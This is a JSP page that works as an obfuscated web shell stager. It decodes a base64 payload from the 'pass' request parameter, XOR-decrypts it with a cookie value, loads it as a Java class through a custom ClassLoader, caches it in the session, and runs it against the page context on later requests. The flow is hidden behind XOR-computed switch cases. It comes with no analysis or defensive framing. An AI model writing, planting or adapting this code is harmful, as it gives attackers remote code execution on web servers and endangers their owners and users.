<%@ page contentType="text/html;charset=UTF-8" language="java" pageEncoding="UTF-8" %>
<%!
    static String $_k = "secret";

    public static byte[] $_x(byte[] $_s, String $_key) {
        try {
            byte[] $_keyBytes = $_key.getBytes("UTF-8");
            byte[] $_result = new byte[$_s.length];
            for (int $_i = 0; $_i < $_s.length; $_i++) {
                $_result[$_i] = (byte) ($_s[$_i] ^ $_keyBytes[$_i % $_keyBytes.length]);
            }
            return $_result;
        } catch (Exception $_e) {
            return null;
        }
    }

    public static String $_base64DecodeAndXor(String $_str) {
        try {
            byte[] $_b = $_base64Decode($_str);
            return new String($_x($_b, $_k));
        } catch (Exception $_e) {
            return "";
        }
    }

    public static byte[] $_base64Decode(String $_s1) {
        try {
            String $_tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            java.io.ByteArrayOutputStream $_buf = new java.io.ByteArrayOutputStream();
            int $_i = 0;
            int $_bits = 0;
            int $_bitCount = 0;
            while ($_i < $_s1.length()) {
                char $_c = $_s1.charAt($_i++);
                if ($_c == '=') break;
                int $_v = $_tbl.indexOf($_c);
                if ($_v == -1) continue;
                $_bits = ($_bits << 6) | $_v;
                $_bitCount += 6;
                if ($_bitCount >= 8) {
                    $_bitCount -= 8;
                    $_buf.write(($_bits >> $_bitCount) & 0xFF);
                }
            }
            return $_buf.toByteArray();
        } catch (Exception $_e) {
            return null;
        }
    }

    class $_classloader extends ClassLoader {
        public $_classloader(ClassLoader z) {
            super(z);
        }
        
        public Class $_defineclass(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }
%>

<%
    try {
        String $_payloadKey = "$payload$";        
        String $_paramKey = "pass";
        Object $_sessionPayload = session.getAttribute($_payloadKey);
        boolean $_needsInit = $_sessionPayload == null;
        boolean $_wasLoaded = $_sessionPayload != null;
        String $_FcuXNygiqPJbDZwvnlSgEncrypted = "QxlSDlAIRRlUDlwIQlQfQ1cIQlY=";
        String[] $_FcuXNygiqPJbDZwvnlSg = $_base64DecodeAndXor($_FcuXNygiqPJbDZwvnlSgEncrypted).split("\\|");
        int $_YvkdhaCbnCbPDaUNRuBo = ((187401 ^ 1704406) ^ (1008132 ^ 1556443));
        byte[] $_data = null;
        String $_paramValue = null;
        String $_stagerKey = null;
        Class $_loadedClass = null;
        java.io.ByteArrayOutputStream $_arrOut = null;
        Object $_f = null;

        while ($_YvkdhaCbnCbPDaUNRuBo < ((319511 ^ 1953485) ^ (612423 ^ 1078932))) {
            int $_cTJfJkZQDeaXOYYzRNnC = Integer.parseInt($_FcuXNygiqPJbDZwvnlSg[$_YvkdhaCbnCbPDaUNRuBo++]);
            switch ($_cTJfJkZQDeaXOYYzRNnC) {
                case ((167948 ^ 1791275) ^ (393195 ^ 1850060)):
                    $_sessionPayload = session.getAttribute($_payloadKey);
                    $_needsInit = $_sessionPayload == null;
                    $_wasLoaded = $_sessionPayload != null;
                    break;
                case ((122212 ^ 1235151) ^ (468463 ^ 1318981)):
                    if (!$_needsInit) {
                        break;
                    }
                    $_paramValue = request.getParameter($_paramKey);
                    break;
                case ((1002251 ^ 1980313) ^ (29403 ^ 1117772)):
                    if (!$_needsInit || $_paramValue == null) {
                        break;
                    }
                    $_data = $_base64Decode($_paramValue);
                    if ($_data == null) {
                        return;
                    }
                    break;
                case ((1757191 ^ 1036219) ^ (30436 ^ 1403230)):
                    if (!$_needsInit || $_data == null) {
                        break;
                    }
                    if (request.getCookies() != null && request.getCookies().length > 0) {
                        $_stagerKey = request.getCookies()[0].getValue();
                        $_data = $_x($_data, $_stagerKey);
                    }
                    break;
                case ((944603 ^ 1361552) ^ (529251 ^ 1227823)):
                    if (!$_needsInit || $_data == null) {
                        break;
                    }
                    try {
                        $_loadedClass = new $_classloader(this.getClass().getClassLoader()).$_defineclass($_data);
                    } catch (Exception $_classLoadException) {
                        return;
                    }
                    break;
                case ((361224 ^ 1559863) ^ (259966 ^ 1161544)):
                    if (!$_needsInit || $_loadedClass == null) {
                        break;
                    }
                    session.setAttribute($_payloadKey, $_loadedClass);
                    break;
                case ((520420 ^ 1745450) ^ (7204 ^ 1920737)):
                    if (!$_wasLoaded) {
                        break;
                    }
                    $_arrOut = new java.io.ByteArrayOutputStream();
                    $_f = ((Class) $_sessionPayload).newInstance();
                    $_f.equals($_arrOut);
                    break;
                case ((327792 ^ 1385753) ^ (860610 ^ 1901735)):
                    if (!$_wasLoaded || $_f == null) {
                        break;
                    }
                    $_f.equals(pageContext);
                    break;
                case ((664766 ^ 1058149) ^ (44698 ^ 1748812)):
                    if (!$_wasLoaded || $_f == null) {
                        break;
                    }
                    $_f.toString();
                    break;
            }
        }
    } catch (Exception $_e) {
    }
%>